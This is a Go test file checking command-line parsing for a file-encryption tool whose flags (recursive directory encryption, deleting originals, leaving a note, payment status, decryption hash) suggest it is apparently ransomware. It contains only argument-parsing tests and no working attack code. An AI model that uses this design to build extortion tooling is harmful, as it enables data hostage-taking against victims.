package cli

import (
	"os"
	"path/filepath"
	"testing"
)

func TestParseCLIArgsE(t *testing.T) {
	// SETUP
	args := []string{"-e"}
	// TEST
	settings, err := ParseCLIArgs(args)
	if err != nil {
		t.Error(err)
	}
	if !settings.EncryptionMode {
		t.Errorf("Expected mode %v but got %v", true, false)
	}

	t.Logf("Encryption flag set successively")
}

func TestDirFlag(t *testing.T) {
	args := []string{"-e", "--dir", "."}

	settings, err := ParseCLIArgs(args)
	if err != nil {
		t.Error(err)
	}
	if !settings.EncryptionMode {
		t.Errorf("Expected mode %v but got %v", true, false)
	}
	d, e := filepath.Abs(".")
	if e != nil {
		t.Error("Error getting absolute path")
	}
	sd, se := settings.GetDir()

	if se != nil {
		t.Error(se)
	}

	if sd != d {
		t.Error("expected to run in ", d)
	}
}

func TestRecursionFlag(t *testing.T) {
	args := []string{"-e", "--dir", ".", "-r"}

	settings, err := ParseCLIArgs(args)
	if err != nil {
		t.Error(err)
	}
	if !settings.EncryptionMode {
		t.Errorf("Expected mode %v but got %v", true, false)
	}
	d, e := filepath.Abs(".")
	if e != nil {
		t.Error("Error getting absolute path")
	}

	sd, se := settings.GetDir()

	if se != nil {
		t.Error(se)
	}

	if sd != d {
		t.Error("expected to run in ", d)
	}
	if !settings.Recursion {
		t.Error("expected to run in ", d)
	}
}

func TestParseCLIArgsD(t *testing.T) {
	// SETUP
	args := []string{"-d", "--key", "key"}
	// TEST
	settings, err := ParseCLIArgs(args)
	if err != nil {
		t.Error(err)
	}
	if settings.EncryptionMode {
		t.Errorf("Expected mode %v but got %v", true, false)
	}
	t.Logf("Decryption flag set successively")
	//TEARDOWN
}

func TestParseCLIArgsEE(t *testing.T) {
	// SETUP
	args := []string{"-e", "--ee", "tst"}
	// TEST
	settings, err := ParseCLIArgs(args)
	if err != nil {
		t.Error(err)
	}
	if settings.EncryptedFileExt != "tst" {
		t.Errorf("Expected mode tst but got %v", settings.EncryptedFileExt)
	}
	t.Logf("Decryption flag set successively")
	//TEARDOWN
}

func TestParseCLIArgsUnknownArgs(t *testing.T) {
	// SETUP
	args := []string{"-d", "wat", "--key", "key"}
	// TEST
	_, err := ParseCLIArgs(args)
	if err == nil {
		t.Error("error expected")
	}
	if err.Error() != "Unexpected entries in command line arguments!" {
		t.Error(err)
	}
	//TEARDOWN
}

func TestParseCLIArgsED(t *testing.T) {
	// SETUP
	args := []string{"-e", "-d", "--key", "key"}
	// TEST
	_, err := ParseCLIArgs(args)
	if err == nil {
		t.Error("error expected")
	}
	if err.Error() != "Mode: only one flag is required" {
		t.Error("unexpected error occurred")
	}
	//TEARDOWN
}

func TestParseCLIArgsMissingED(t *testing.T) {
	// SETUP
	args := []string{"wat", "-f"}
	// TEST
	_, err := ParseCLIArgs(args)
	if err == nil {
		t.Error("error expected")
	}
	if err.Error() != "Mode: only one flag is required" {
		t.Error("unexpected error occurred")
	}
	//TEARDOWN
}

func TestParseCLIArgsBadArgument(t *testing.T) {
	// SETUP
	args := []string{"-e", "--key", "--aaa"}
	// TEST
	_, err := ParseCLIArgs(args)
	if err == nil {
		t.Error("error expected")
	}
	if err.Error() != "Key: missing value for parameter" {
		t.Error("unexpected error occurred")
	}

	//TEARDOWN
}

func TestConfigPlusCLI(t *testing.T) {
	const testJson string = `{
		"EncryptedFileExt": "wd",
		"Dir": "nope/",
		"EncryptionMode": false,
		"Key": "10",
		"Recursion": false,
		"ReplaceOriginal": false
	}`
	testDir := t.TempDir()
	configFile := testDir + "/test.json"
	os.WriteFile(configFile, []byte(testJson), 0777)
	args := []string{"-e", "--dir", ".", "-r", "--config", configFile}

	s, e := ParseCLIArgs(args)
	if e != nil {
		t.Error(e)
	}
	if s.EncryptedFileExt != "wd" {
		t.Error("wd")
	}

	if s.Dir == "nope/" {
		t.Error("Dir")
	}

	if !s.EncryptionMode {
		t.Error("Mode")
	}

	if len(s.Key) != 2 {
		t.Error("Key")
	}
	if !s.Recursion {
		t.Error("Recursion")
	}
	if s.ReplaceOriginal {
		t.Error("Replace original")
	}
}

func TestDeleteFlag(t *testing.T) {
	// SETUP
	args := []string{"-e", "-del"}
	// TEST
	s, err := ParseCLIArgs(args)
	if err != nil {
		t.Error("error expected")
	}
	if !s.Delete {
		t.Error("Delete should be +true+")
	}
}

func TestEncryptWithKey(t *testing.T) {
	// SETUP
	args := []string{"-e", "--key", "59703373367639792442264528482B4D6251655468576D5A7134743777217A25"}
	// TEST
	_, err := ParseCLIArgs(args)
	if err != nil {
		t.Error(err)
	}
}

func TestBasics(t *testing.T) {
	// SETUP
	args := []string{"-e", "--key", "224334343", "--dir", "C:/"}
	// TEST
	s, e := ParseCLIArgs(args)
	if e != nil {
		t.Error(e)
	}
	if s.Delete {
		t.Error("Delete")
	}

	if s.LeaveNote {
		t.Error("Leave note")
	}

	if s.GetSep() != "," {
		t.Error("Sep")
	}

	d, e := s.GetDir()
	if e != nil {
		t.Error(e)
	}

	if d != "C:\\" {
		t.Error("Dir")
	}

	if !s.EncryptionMode {
		t.Error("Mode")
	}

	if s.FileFormat != "txt" {
		t.Error("File Format")
	}

	if s.Key != "224334343" {
		t.Error("Key")
	}
	if s.Recursion {
		t.Error("Recursion")
	}
	if s.ReplaceOriginal {
		t.Error("Replace original")
	}
}

func TestDecryptionHash(t *testing.T) {
	// SETUP
	args := []string{"-e", "--dh", "decryptionHash"}
	// TEST
	s, e := ParseCLIArgs(args)
	if e != nil {
		t.Error(e)
	}
	if s.DecryptionHash != "decryptionHash" {
		t.Error("decryption hash not set")
	}
}

func TestPaidStatus(t *testing.T) {
	// SETUP
	args := []string{"-e", "-p"}
	// TEST
	s, e := ParseCLIArgs(args)
	if e != nil {
		t.Error(e)
	}
	if !s.PaidStatus {
		t.Error("Paid status not set")
	}
}

func TestDefaults(t *testing.T) {
	// SETUP
	args := []string{"-e"}
	// TEST
	s, e := ParseCLIArgs(args)
	if e != nil {
		t.Error(e)
	} /*
				EncryptionMode   bool
			Delete           bool
			sep              string
			Key              string
			Dir              string
			FileFormat       string
			ReplaceOriginal  bool
			EncryptedFileExt string
			Recursion        bool
			LeaveNote        bool
		}
	*/
	if s.Delete {
		t.Error("Delete")
	}

	if s.LeaveNote {
		t.Error("Leave note")
	}

	if s.GetSep() != "," {
		t.Error("Sep")
	}

	if s.Dir != "." {
		t.Error("Dir")
	}

	if !s.EncryptionMode {
		t.Error("Mode")
	}

	if s.FileFormat != "txt" {
		t.Error("File Format")
	}

	if len(s.Key) == 0 {
		t.Error("Key")
	}
	if s.Recursion {
		t.Error("Recursion")
	}
	if s.ReplaceOriginal {
		t.Error("Replace original")
	}
	if s.PaidStatus {
		t.Error("Paid")
	}
	if len(s.DecryptionHash) > 0 {
		t.Error("Hash")
	}
}
